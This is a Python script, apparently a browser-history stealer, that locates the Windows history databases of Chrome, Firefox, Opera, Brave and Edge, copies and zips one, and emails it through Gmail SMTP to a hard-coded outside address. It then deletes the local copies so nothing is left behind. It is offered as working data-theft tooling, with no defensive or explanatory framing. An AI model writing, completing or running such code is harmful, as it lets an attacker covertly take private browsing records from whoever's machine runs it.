import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import os
from shutil import copyfile
import zipfile

def send_email(filename, attachment, to_addr):
    from_addr = 'Your Gmail Email Address Here'   # Your Gmail Email Address
    app_password = 'Your Gmail App Password Here'  # Your Gmail App Password Aka An SMTP Server API Key

    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = 'Browsing History and Data'

    body = 'Attached is the browsing history and data file.'
    msg.attach(MIMEText(body, 'plain'))

    with open(attachment, 'rb') as f:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={filename}')
        msg.attach(part)

    try:
        # Connect to Gmail's SMTP server
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  # Upgrade the connection to a secure encrypted SSL/TLS connection
        server.login(from_addr, app_password)
        server.sendmail(from_addr, to_addr, msg.as_string())
        server.quit()
        print("Email sent successfully!")
        return True
    except Exception as e:
        print(f"Failed to send email: {e}")
        return False

def get_browser_history(browser_name):
    user_profile = os.getenv('USERPROFILE')
    history_paths = {
        'chrome': os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History'),
        'firefox': os.path.join(user_profile, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
        'opera': os.path.join(user_profile, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'History'),
        'brave': os.path.join(user_profile, 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History'),
        'edge': os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History')
    }

    history_path = history_paths.get(browser_name)
    if not history_path:
        raise Exception(f"No history path found for {browser_name}")

    if browser_name == 'firefox':
        for root, dirs, files in os.walk(history_path):
            for file in files:
                if file.endswith('.sqlite'):
                    history_path = os.path.join(root, file)
                    break

    if os.path.exists(history_path):
        copyfile(history_path, f'{browser_name}_History')
        return f'{browser_name}_History'
    else:
        raise Exception(f"{browser_name} history file not found")

def compress_file(file_path):
    zip_file = file_path + '.zip'
    with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(file_path, os.path.basename(file_path))
    return zip_file

def main():
    browsers = ['chrome', 'firefox', 'opera', 'brave', 'edge']
    sent = False

    for browser in browsers:
        try:
            history_file = get_browser_history(browser)
            compressed_file = compress_file(history_file)
            
            # Check file size and adjust compression if necessary
            if os.path.getsize(compressed_file) > 20 * 1024 * 1024:  # If greater than 20MB
                print(f"Compressed file size is too large: {os.path.getsize(compressed_file)} bytes")
                # Handle large file size (e.g., further compress, notify user, etc.)
                continue
            
            if send_email(os.path.basename(compressed_file), compressed_file, 'usbbasher@gmail.com'):  # Send to yourself
                # If the email was sent successfully, delete the history and compressed files
                os.remove(history_file)
                os.remove(compressed_file)
                print(f"Deleted history file: {history_file} and compressed file: {compressed_file}")
                
                sent = True
                break
        except Exception as e:
            print(f"An error occurred with {browser}: {e}")

    if not sent:
        print("No browsing history could be collected.")

if __name__ == "__main__":
    main()
